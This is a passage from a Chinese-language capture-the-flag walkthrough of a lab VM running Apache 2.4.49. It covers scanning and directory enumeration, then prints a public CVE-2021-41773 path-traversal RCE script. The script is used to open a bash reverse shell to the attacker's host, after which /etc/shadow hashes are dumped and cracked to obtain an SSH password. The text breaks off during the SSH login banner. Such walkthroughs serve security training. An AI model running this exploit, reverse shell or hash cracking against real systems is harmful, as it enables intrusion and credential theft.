<span class="token operator">|</span>_http-server-header: Apache/2.4.49 <span class="token punctuation">(</span>Unix<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Apaches
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Potentially risky methods: TRACE
MAC Address: 08:00:27:B2:79:A9 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.41</span> ms <span class="token number">192.168</span>.56.159

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">8.55</span> seconds</code></pre>
<p>开放了 22 80 两个端口，80端口如机器名字开了个Apache服务 版本 2.4.49<br><img src="https://ooo.0x0.ooo/2024/04/23/OpyT5F.png" alt="OpyT5F.png" loading="lazy"><br>源码看了一下，界面功能测试一下没有找到利用。</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://192.168.56.159 -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.159
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              bak,zip,html,txt,php
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">33940</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">199</span><span class="token punctuation">]</span>
/images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">237</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.159/images/<span class="token punctuation">]</span>
/css                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">234</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.159/css/<span class="token punctuation">]</span>
/js                   <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">233</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.159/js/<span class="token punctuation">]</span>
/robots.txt           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">116</span><span class="token punctuation">]</span>
/fonts                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">236</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.159/fonts/<span class="token punctuation">]</span></code></pre>
<p>目录内容也不是很多，有个robots.txt</p>
<blockquote>
<p>User-agent: *<br>Disallow: &#x2F;</p>
<p>IOKAnFlvdSBrbm93IHlvdXIgcGF0aCwgY2hpbGQsIG5vdyBmb2xsb3cgaXQu4oCdCi0tIFBvY2Fob250YXMg</p>
</blockquote>
<p>里面有个base64字符串，解码发现并没有什么用<br><img src="https://ooo.0x0.ooo/2024/04/23/OpyUA6.png" alt="OpyUA6.png" loading="lazy"><br>web差不多测到这里</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>根据机器名，大概率是apache漏洞,我先用msf搜一下漏洞没搜到能利用的</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># msfconsole     </span>
Metasploit tip: Use sessions <span class="token parameter variable">-1</span> to interact with the last opened session
                                                  

      .:okOOOkdc<span class="token string">'           '</span>cdkOOOko:.                                                                                                                                                                                                               
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                                                                                                                                             
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                                                                                                                                            
  <span class="token string">'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'</span>                                                                                                                                                                                                           
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo                                                                                                                                                                                                           
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx                                                                                                                                                                                                           
  lOOOOOOOO.         <span class="token punctuation">;</span>d<span class="token punctuation">;</span>         ,OOOOOOOOl                                                                                                                                                                                                           
  .OOOOOOOO.   <span class="token builtin class-name">.</span><span class="token punctuation">;</span>           <span class="token punctuation">;</span>    ,OOOOOOOO.                                                                                                                                                                                                           
   cOOOOOOO.   .OOc.     <span class="token string">'oOO.   ,OOOOOOOc                                                                                                                                                                                                            
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo                                                                                                                                                                                                             
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl                                                                                                                                                                                                              
      ;OOOO'</span>   .OOOO.   :OOOO.   <span class="token punctuation">;</span>OOOO<span class="token punctuation">;</span>                                                                                                                                                                                                               
       .dOOo   .OOOOocccxOOOO.   xOOd.                                                                                                                                                                                                                
         ,kOl  .OOOOOOOOOOOOO. .dOk,                                                                                                                                                                                                                  
           :kk<span class="token punctuation">;</span>.OOOOOOOOOOOOO.cOk:                                                                                                                                                                                                                    
             <span class="token punctuation">;</span>kOOOOOOOOOOOOOOOk:                                                                                                                                                                                                                      
               ,xOOOOOOOOOOOx,                                                                                                                                                                                                                        
                 .lOOOOOOOl.                                                                                                                                                                                                                          
                    ,dOd,                                                                                                                                                                                                                             
                      <span class="token builtin class-name">.</span>                                                                                                                                                                                                                               

       <span class="token operator">=</span><span class="token punctuation">[</span> metasploit v6.4.5-dev                           <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">2413</span> exploits - <span class="token number">1242</span> auxiliary - <span class="token number">423</span> post       <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">1468</span> payloads - <span class="token number">47</span> encoders - <span class="token number">11</span> nops           <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">9</span> evasion                                       <span class="token punctuation">]</span>

Metasploit Documentation: https://docs.metasploit.com/

msf6 <span class="token operator">></span> search apache <span class="token number">2.4</span>.49

Matching Modules
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

   <span class="token comment">#  Name                                          Disclosure Date  Rank       Check  Description</span>
   -  ----                                          ---------------  ----       -----  -----------
   <span class="token number">0</span>  exploit/multi/http/apache_normalize_path_rce  <span class="token number">2021</span>-05-10       excellent  Yes    Apache <span class="token number">2.4</span>.49/2.4.50 Traversal RCE
   <span class="token number">1</span>    <span class="token punctuation">\</span>_ target: Automatic <span class="token punctuation">(</span>Dropper<span class="token punctuation">)</span>              <span class="token builtin class-name">.</span>                <span class="token builtin class-name">.</span>          <span class="token builtin class-name">.</span>      <span class="token builtin class-name">.</span>
   <span class="token number">2</span>    <span class="token punctuation">\</span>_ target: Unix Command <span class="token punctuation">(</span>In-Memory<span class="token punctuation">)</span>         <span class="token builtin class-name">.</span>                <span class="token builtin class-name">.</span>          <span class="token builtin class-name">.</span>      <span class="token builtin class-name">.</span>
   <span class="token number">3</span>  auxiliary/scanner/http/apache_normalize_path  <span class="token number">2021</span>-05-10       normal     No     Apache <span class="token number">2.4</span>.49/2.4.50 Traversal RCE scanner
   <span class="token number">4</span>    <span class="token punctuation">\</span>_ action: CHECK_RCE                        <span class="token builtin class-name">.</span>                <span class="token builtin class-name">.</span>          <span class="token builtin class-name">.</span>      Check <span class="token keyword">for</span> RCE <span class="token punctuation">(</span>if mod_cgi is enabled<span class="token punctuation">)</span>.
   <span class="token number">5</span>    <span class="token punctuation">\</span>_ action: CHECK_TRAVERSAL                  <span class="token builtin class-name">.</span>                <span class="token builtin class-name">.</span>          <span class="token builtin class-name">.</span>      Check <span class="token keyword">for</span> vulnerability.
   <span class="token number">6</span>    <span class="token punctuation">\</span>_ action: READ_FILE                        <span class="token builtin class-name">.</span>                <span class="token builtin class-name">.</span>          <span class="token builtin class-name">.</span>      Read <span class="token function">file</span> on the remote server.


Interact with a module by name or index. For example info <span class="token number">6</span>, use <span class="token number">6</span> or use auxiliary/scanner/http/apache_normalize_path
After interacting with a module you can manually <span class="token builtin class-name">set</span> a ACTION with <span class="token builtin class-name">set</span> ACTION <span class="token string">'READ_FILE'</span></code></pre>
<p>然后换了searchsploit 搜出rce,我此时才知道两个工具用的不是一个漏洞库-.-</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># searchsploit apache 2.4.49</span>
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                      <span class="token operator">|</span>  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP <span class="token operator">&lt;</span> <span class="token number">5.3</span>.12 / <span class="token operator">&lt;</span> <span class="token number">5.4</span>.2 - cgi-bin Remote Code Execution                                                                                                                                                     <span class="token operator">|</span> php/remote/29290.c
Apache + PHP <span class="token operator">&lt;</span> <span class="token number">5.3</span>.12 / <span class="token operator">&lt;</span> <span class="token number">5.4</span>.2 - Remote Code Execution + Scanner                                                                                                                                                   <span class="token operator">|</span> php/remote/29316.py
Apache CXF <span class="token operator">&lt;</span> <span class="token number">2.5</span>.10/2.6.7/2.7.4 - Denial of Service                                                                                                                                                                 <span class="token operator">|</span> multiple/dos/26710.txt
Apache HTTP Server <span class="token number">2.4</span>.49 - Path Traversal <span class="token operator">&amp;</span> Remote Code Execution <span class="token punctuation">(</span>RCE<span class="token punctuation">)</span>                                                                                                                                            <span class="token operator">|</span> multiple/webapps/50383.sh
Apache mod_ssl <span class="token operator">&lt;</span> <span class="token number">2.8</span>.7 OpenSSL - <span class="token string">'OpenFuck.c'</span> Remote Buffer Overflow                                                                                                                                                <span class="token operator">|</span> unix/remote/21671.c
Apache mod_ssl <span class="token operator">&lt;</span> <span class="token number">2.8</span>.7 OpenSSL - <span class="token string">'OpenFuckV2.c'</span> Remote Buffer Overflow <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                                                                                                                                          <span class="token operator">|</span> unix/remote/764.c
Apache mod_ssl <span class="token operator">&lt;</span> <span class="token number">2.8</span>.7 OpenSSL - <span class="token string">'OpenFuckV2.c'</span> Remote Buffer Overflow <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                                                                                                                                          <span class="token operator">|</span> unix/remote/47080.c
Apache OpenMeetings <span class="token number">1.9</span>.x <span class="token operator">&lt;</span> <span class="token number">3.1</span>.0 - <span class="token string">'.ZIP'</span> File Directory Traversal                                                                                                                                                 <span class="token operator">|</span> linux/webapps/39642.txt
Apache Tomcat <span class="token operator">&lt;</span> <span class="token number">5.5</span>.17 - Remote Directory Listing                                                                                                                                                                   <span class="token operator">|</span> multiple/remote/2061.txt
Apache Tomcat <span class="token operator">&lt;</span> <span class="token number">6.0</span>.18 - <span class="token string">'utf8'</span> Directory Traversal                                                                                                                                                                 <span class="token operator">|</span> unix/remote/14489.c
Apache Tomcat <span class="token operator">&lt;</span> <span class="token number">6.0</span>.18 - <span class="token string">'utf8'</span> Directory Traversal <span class="token punctuation">(</span>PoC<span class="token punctuation">)</span>                                                                                                                                                           <span class="token operator">|</span> multiple/remote/6229.txt
Apache Tomcat <span class="token operator">&lt;</span> <span class="token number">9.0</span>.1 <span class="token punctuation">(</span>Beta<span class="token punctuation">)</span> / <span class="token operator">&lt;</span> <span class="token number">8.5</span>.23 / <span class="token operator">&lt;</span> <span class="token number">8.0</span>.47 / <span class="token operator">&lt;</span> <span class="token number">7.0</span>.8 - JSP Upload Bypass / Remote Code Execution <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                                                                                                        <span class="token operator">|</span> windows/webapps/42953.txt
Apache Tomcat <span class="token operator">&lt;</span> <span class="token number">9.0</span>.1 <span class="token punctuation">(</span>Beta<span class="token punctuation">)</span> / <span class="token operator">&lt;</span> <span class="token number">8.5</span>.23 / <span class="token operator">&lt;</span> <span class="token number">8.0</span>.47 / <span class="token operator">&lt;</span> <span class="token number">7.0</span>.8 - JSP Upload Bypass / Remote Code Execution <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                                                                                                        <span class="token operator">|</span> jsp/webapps/42966.py
Apache Xerces-C XML Parser <span class="token operator">&lt;</span> <span class="token number">3.1</span>.2 - Denial of Service <span class="token punctuation">(</span>PoC<span class="token punctuation">)</span>                                                                                                                                                        <span class="token operator">|</span> linux/dos/36906.txt
Webfroot Shoutbox <span class="token operator">&lt;</span> <span class="token number">2.32</span> <span class="token punctuation">(</span>Apache<span class="token punctuation">)</span> - Local File Inclusion / Remote Code Execution                                                                                                                                    <span class="token operator">|</span> linux/remote/34.pl
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results</code></pre>
<p>发现有个rce漏洞</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat 50383.sh              </span>
<span class="token comment"># Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal &amp; Remote Code Execution (RCE)</span>
<span class="token comment"># Date: 10/05/2021</span>
<span class="token comment"># Exploit Author: Lucas Souza https://lsass.io</span>
<span class="token comment"># Vendor Homepage:  https://apache.org/</span>
<span class="token comment"># Version: 2.4.49</span>
<span class="token comment"># Tested on: 2.4.49</span>
<span class="token comment"># CVE : CVE-2021-41773</span>
<span class="token comment"># Credits: Ash Daulton and the cPanel Security Team</span>

<span class="token comment">#!/bin/bash</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$1</span> <span class="token operator">==</span> <span class="token string">''</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$2</span> <span class="token operator">==</span> <span class="token string">''</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
<span class="token builtin class-name">echo</span> Set <span class="token punctuation">[</span>TAGET-LIST.TXT<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token environment constant">PATH</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>COMMAND<span class="token punctuation">]</span>
<span class="token builtin class-name">echo</span> ./PoC.sh targets.txt /etc/passwd
<span class="token builtin class-name">exit</span>
<span class="token keyword">fi</span>
<span class="token keyword">for</span> <span class="token for-or-select variable">host</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> $1<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$host</span>
<span class="token function">curl</span> <span class="token parameter variable">-s</span> --path-as-is <span class="token parameter variable">-d</span> <span class="token string">"echo Content-Type: text/plain; echo; <span class="token variable">$3</span>"</span> <span class="token string">"<span class="token variable">$host</span>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e<span class="token variable">$2</span>"</span><span class="token punctuation">;</span> <span class="token keyword">done</span>

<span class="token comment"># PoC.sh targets.txt /etc/passwd</span>
<span class="token comment"># PoC.sh targets.txt /bin/sh whoami                                                                                                                                                                                                     </span></code></pre>
<p>利用手法是<code>./50383.sh targets.txt /bin/sh command</code><br>把靶机写入一个target.txt</p>
<blockquote>
<p>┌──(root㉿kali2)-[~&#x2F;Desktop]<br>└─# cat targets.txt<br>192.168.56.159</p>
</blockquote>
<p>然后反弹个shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ./50383.sh targets.txt /bin/bash 'bash -i >&amp; /dev/tcp/192.168.56.104/4567 0>&amp;1'</span>
./50383.sh: <span class="token number">12</span>: <span class="token punctuation">[</span><span class="token punctuation">[</span>: not found
./50383.sh: <span class="token number">12</span>: <span class="token punctuation">[</span><span class="token punctuation">[</span>: not found
<span class="token number">192.168</span>.56.159</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.159<span class="token punctuation">]</span> <span class="token number">56152</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">836</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
daemon@apaches:/usr/bin$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">(</span>daemon<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">(</span>daemon<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">(</span>daemon<span class="token punctuation">)</span></code></pre>
<p>不过权限很低，想办法提取</p>
<h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><p>先看home下有哪些用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">daemon@apaches:/usr/sbin$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /home
<span class="token function">ls</span> <span class="token parameter variable">-al</span> /home
total <span class="token number">24</span>
drwxr-xr-x  <span class="token number">6</span> root       root       <span class="token number">4096</span> Oct  <span class="token number">9</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">20</span> root       root       <span class="token number">4096</span> Sep <span class="token number">30</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">4</span> geronimo   geronimo   <span class="token number">4096</span> Jul <span class="token number">13</span>  <span class="token number">2023</span> geronimo
drwxr-xr-x  <span class="token number">4</span> pocahontas pocahontas <span class="token number">4096</span> Apr <span class="token number">23</span> <span class="token number">10</span>:00 pocahontas
drwxr-xr-x  <span class="token number">7</span> sacagawea  sacagawea  <span class="token number">4096</span> Apr <span class="token number">23</span> <span class="token number">10</span>:00 sacagawea
drwxr-xr-x  <span class="token number">5</span> squanto    squanto    <span class="token number">4096</span> Apr <span class="token number">23</span> 09:56 squanto</code></pre>
<p>看了一圈找到了一个定时任务，但是没权限修改</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">daemon@apaches:/home/squanto$ <span class="token function">cat</span> /etc/crontab
<span class="token function">cat</span> /etc/crontab
<span class="token comment"># /etc/crontab: system-wide crontab</span>
<span class="token comment"># Unlike any other crontab you don't have to run the `crontab'</span>
<span class="token comment"># command to install the new version when you edit this file</span>
<span class="token comment"># and files in /etc/cron.d. These files also have username fields,</span>
<span class="token comment"># that none of the other crontabs do.</span>

<span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/sh
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

<span class="token comment"># Example of job definition:</span>
<span class="token comment"># .---------------- minute (0 - 59)</span>
<span class="token comment"># |  .------------- hour (0 - 23)</span>
<span class="token comment"># |  |  .---------- day of month (1 - 31)</span>
<span class="token comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
<span class="token comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="token comment"># |  |  |  |  |</span>
<span class="token comment"># *  *  *  *  * user-name command to be executed</span>
<span class="token number">17</span> *    * * *   root    <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.hourly
<span class="token number">25</span> <span class="token number">6</span>    * * *   root    <span class="token builtin class-name">test</span> <span class="token parameter variable">-x</span> /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.daily <span class="token punctuation">)</span>
<span class="token number">47</span> <span class="token number">6</span>    * * <span class="token number">7</span>   root    <span class="token builtin class-name">test</span> <span class="token parameter variable">-x</span> /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.weekly <span class="token punctuation">)</span>
<span class="token number">52</span> <span class="token number">6</span>    <span class="token number">1</span> * *   root    <span class="token builtin class-name">test</span> <span class="token parameter variable">-x</span> /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.monthly <span class="token punctuation">)</span>
<span class="token comment">#</span>

<span class="token comment">#* 5 * * * * su sacagawea -c "./home/sacagawea/Scripts/backup.sh"</span></code></pre>
<p>随后想试试会不会密码泄露，发现shadow下面有几个密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">geronimo:<span class="token variable">$6</span><span class="token variable">$Ms03aNp5hRoOuZpM</span><span class="token variable">$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ</span>/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
lxd:<span class="token operator">!</span>:19265::::::
squanto:<span class="token variable">$6</span><span class="token variable">$KzBC2ThBhmbVBy0J</span><span class="token variable">$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7</span>.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
sacagawea:<span class="token variable">$6</span><span class="token variable">$7jhI</span>/21/BZR5KyY6<span class="token variable">$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od</span>/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
pocahontas:<span class="token variable">$6</span><span class="token variable">$ecLWB6Q6bVJrGFu8</span><span class="token variable">$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq</span>.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::</code></pre>
<p>正好是home下面的几个用户，尝试john爆破一下</p>
<p>拿到了squanto的密码<code>iamtheone</code>，ssh连接一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh squanto@192.168.56.159         </span>
                                                                                
                                                                                
                                                                                
                                                                  
                                                                        <span class="token operator">>></span>       <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span>         <span class="token operator">>></span>           <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span>   
